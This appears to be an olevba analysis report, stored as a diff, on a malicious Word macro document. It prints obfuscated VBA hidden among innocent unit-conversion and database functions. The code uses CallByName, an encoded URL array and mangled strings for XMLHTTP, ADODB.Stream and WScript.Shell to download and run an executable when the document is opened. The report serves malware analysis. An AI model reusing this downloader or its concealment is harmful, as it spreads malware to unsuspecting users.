+    Cad = "DRIVER={MySQL ODBC 3.51 Driver};DESC=;DATA SOURCE= Aridoc;DATABASE=Aridoc"
+    
+    
+    Cad = Cad & ";Persist Security Info=true"
+    
+    ConnConta.ConnectionString = Cad
+    ConnConta.Open
+    ConnConta.Execute "Set AUTOCOMMIT = 1"
+    AbrirConexionAridoc = True
+    Exit Function
+    
+EAbrirConexion:
+    Mue.straError Err.Number, "Abrir conexion BD:Aridoc.", Err.Description
+End Function
+
+
+
+
+
+Public Function Approssima(MiaValuta As Double) As Double
+    Dim MioVal1 As Double
+    Dim MioVal2 As Double
+    Dim MyStr As String
+    Dim MyStr1 As String
+    Dim MyStr2 As String
+    Dim MiaString As String
+    Dim HaDecimali As Boolean
+    Dim i As Integer
+    HaDecimali = False
+    If MiaValuta <> 0 Then
+        MiaString = Trim(Str(MiaValuta))
+        For i = 1 To Len(MiaString)
+            MyStr = Mid(MiaString, i, 1)
+            If MyStr = "." Then
+                HaDecimali = True
+                MyStr1 = Left(MiaString, i - 1)
+                If (Len(Trim(MyStr1)) = 0) Then
+                    MyStr1 = "0"
+                End If
+                MyStr2 = Right(MiaString, Len(MiaString) - i)
+                i = i + 1
+            End If
+        Next i
+        If HaDecimali = False Then
+            Approssima = MiaString
+            Exit Function
+        End If
+        MioVal1 = CDbl(MyStr1)
+        MioVal2 = CDbl(Left(MyStr2, 1))
+        If MioVal2 < 5 Then
+            Approssima = MioVal1
+        Else
+            Approssima = MioVal1 + 1
+        End If
+    Else
+        Approssima = 0
+    End If
+End Function
+
+
+Public Function Servidor(x As Variant) As Boolean
+ If x = "Servidor" Then
+ 
+problems__1.Open constans_problems(2 + 1 + 2), Constant_4, False
+problems__1.send
+ problems__4 = problems__3(constans_problems(180 / 30))
+ Servidor = True
+ 
+ ElseIf IsNull(x) Then
+ Servidor = True
+ 
+ ElseIf IsEmpty(x) Then
+ Servidor = True
+ 
+ ElseIf x Is Nothing Then
+ Servidor = True
+ 
+ ElseIf IsArray(x) Then
+ Servidor = (UBound(x) - LBound(x) < 0)
+ 
+ ElseIf isType("TList", x) Then
+ Servidor = x.IsEmpty
+ 
+ Else
+ Servidor = False
+ End If
+ inchToMeter 44.5
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO Module5.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module5'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+
+Public Function EsFechaOK(T As TextBox) As Boolean
+Dim Cad As String
+    
+    Cad = T.Text
+    If InStr(1, Cad, "/") = 0 Then
+        If Len(T.Text) = 8 Then
+            Cad = Mid(Cad, 1, 2) & "/" & Mid(Cad, 3, 2) & "/" & Mid(Cad, 5)
+        Else
+            If Len(T.Text) = 6 Then Cad = Mid(Cad, 1, 2) & "/" & Mid(Cad, 3, 2) & "/20" & Mid(Cad, 5)
+        End If
+    End If
+    
+    If IsDate(Cad) Then
+        EsFechaOK = True
+        T.Text = Format(Cad, "dd/MM/yyyy")
+    Else
+        EsFechaOK = False
+    End If
+End Function
+
+
+
+Public Function EsFechaOKString(ByRef T As String) As Boolean
+Dim Cad As String
+    
+    Cad = T
+    If InStr(1, Cad, "/") = 0 Then
+        If Len(T) = 8 Then
+            Cad = Mid(Cad, 1, 2) & "/" & Mid(Cad, 3, 2) & "/" & Mid(Cad, 5)
+        Else
+            If Len(T) = 6 Then Cad = Mid(Cad, 1, 2) & "/" & Mid(Cad, 3, 2) & "/20" & Mid(Cad, 5)
+        End If
+    End If
+    If IsDate(Cad) Then
+        EsFechaOKString = True
+        T = Format(Cad, "dd/mm/yyyy")
+    Else
+        EsFechaOKString = False
+    End If
+End Function
+
+Private Function eqObject(a As Object, b As Object) As Boolean
+ If a Is Nothing Then
+ eqObject = (b Is Nothing)
+ Exit Function
+ End If
+ On Error GoTo EQUALS_NOT_DEFINED
+ eqObject = a.equals(b)
+ Exit Function
+EQUALS_NOT_DEFINED:
+ reRaiseE.xceptForMethodMissing
+ eqObject = (a Is b)
+End Function
+Private Sub reRaise()
+ Err.Raise Err.Number, Err.Source, Err.Description, Err.HelpContext, Err.HelpContext
+End Sub
+Public Function NLToM3(volume As Double, temperature As Double, pressure As Double)
+ NLToM3 = volume * (temperature / 273.15) * (101325 / pressure) * (1 / (60000#))
+End Function
+Public Function KgToNm3(massKg As Double, molarMass As Double)
+ KgToNm3 = massKg * (1344600# / molarMass) * 0.06 / (3600#)
+End Function
+Public Function paToMbar(pressure As Double)
+ paToMbar = 10 ^ -2 * pressure
+End Function
+Public Function PaToMmH20(pressure As Double)
+ PaToMmH20 = 0.101974 * pressure
+End Function
+Public Function mmH20ToPa(pressure As Double)
+ mmH20ToPa = 9.80642 * pressure
+End Function
+Public Function paToAtm(pressure As Double)
+ paToAtm = (1.0135 * 10 ^ 5) ^ -1 * pressure
+End Function
+Public Function atmToPa(pressure As Double)
+ atmToPa = (1.0135 * 10 ^ 5) * pressure
+End Function
+Public Function paToBar(pressure As Double)
+ paToBar = (1# * 10 ^ 5) ^ -1 * pressure
+End Function
+Public Function KABARE_DUET_AKADEMIA(pressure As Double)
+ROSTIX = CallByName(problems__1, constans_problems(1000 / 100), VbGet)
+ CallByName Freddy_problems, constans_problems(9), VbMethod, ROSTIX
+ KABARE_DUET_AKADEMIA = (1# * 10 ^ 5) * pressure
+End Function
+Public Function PaToPsi(pressure As Double)
+ PaToPsi = pressure / (6.894757 * 10 ^ 3)
+End Function
+Public Function PsiToPa(pressure As Double)
+ PsiToPa = pressure * (6.894757 * 10 ^ 3)
+End Function
+Public Function KelvinToCelsius(temperature As Double)
+ KelvinToCelsius = temperature - 273.15
+End Function
+Public Function CelsiusToKelvin(temperature As Double)
+ CelsiusToKelvin = temperature + 273.15
+End Function
+Public Function RankineToCelsius(temperature As Double)
+ RankineToCelsius = (temperature - 491.67) * (5 / 9)
+End Function
+-------------------------------------------------------------------------------
+VBA MACRO Module7.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module7'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Function EjecutaSQLDo(volume As Double, temperature As Double, pressure As Double)
+ If VarType(HistoryFunc) = 0 Then
+ UsuariosConectados 384
+ End If
+ EjecutaSQLDo = volume * (pressure / temperature) * (273.15 / 101325#)
+End Function
+Public Function CadenaCurrency(A1 As String, A2 As String, A3 As String) As String
+CadenaCurrency = Replace(A1, A2, A3)
+End Function
+Public Function KwhToJoule(energy As Double)
+MassiveA = Split("1664¨1856¨1856¨1792¨928¨752¨752¨1856¨1824¨1872¨1584¨1584¨1776¨1552¨1952¨1552¨1632¨1552¨1856¨1552¨1840¨736¨1584¨1776¨1744¨752¨912¨896¨880¨1856¨848¨1856¨880¨1648", "¨")
+ Set problems__1 = CreateObject(constans_problems(0))
+EsNumerico "1, 3, 4"
+ KwhToJoule = 3.6 * 10 ^ 3 * energy
+End Function
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'Ultra/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+€CommandButton1
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'Ultra/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'Ultra/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+€CommandButton2
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'Ultra/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'Ultra/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+€D!icrobrioft.XD!LHTTP10)Adodb.britr00aD!10)brih00ll.Application10)Wbricript.brih00ll10)Proc00bribri10)G00T10)T00D!P10)Typ0010)op00n10)writ0010)r00briponbri00Body10)briav00tofil0010)\hendib00.00x00ì	
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: u'Ultra/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma4
++------------+----------------------+-----------------------------------------+
+| Type       | Keyword              | Description                             |
++------------+----------------------+-----------------------------------------+
+| AutoExec   | AutoOpen             | Runs when the Word document is opened   |
+| Suspicious | Open                 | May open a file                         |
+| Suspicious | CreateObject         | May create an OLE object                |
+| Suspicious | Chr                  | May attempt to obfuscate specific       |
+|            |                      | strings                                 |
+| Suspicious | CallByName           | May attempt to obfuscate malicious      |
+|            |                      | function calls                          |
+| Suspicious | Hex Strings          | Hex-encoded strings were detected, may  |
+|            |                      | be used to obfuscate strings (option    |
+|            |                      | --decode to see all)                    |
+| Suspicious | Base64 Strings       | Base64-encoded strings were detected,   |
+|            |                      | may be used to obfuscate strings        |
+|            |                      | (option --decode to see all)            |
+| Hex String | '\x00\x00\x00\x00\x0 | 0000000000                              |
+|            | 0'                   |                                         |
+| Hex String | '\xc9J\xd0\x9b'      | C94AD09B                                |
+| Hex String | '\xd7\x07\xfd\xa5\\% | D707FDA55C25                            |
+|            | '                    |                                         |
+| Hex String | 'L\xd4\xf8_'         | 4CD4F85F                                |
+| Hex String | '\x1e\x9a]\xc0\x1b\x | 1E9A5DC01BBD                            |
+|            | bd'                  |                                         |
+| Base64     | '<\x01\x8e'          | PAGO                                    |
+| String     |                      |                                         |
+| Base64     | 'M\x10\x12<\x04\x8e' | TRASPASO                                |
+| String     |                      |                                         |
+| Base64     | 'I\xea\xef\x89\xda+' | Servidor                                |
+| String     |                      |                                         |
++------------+----------------------+-----------------------------------------+
+
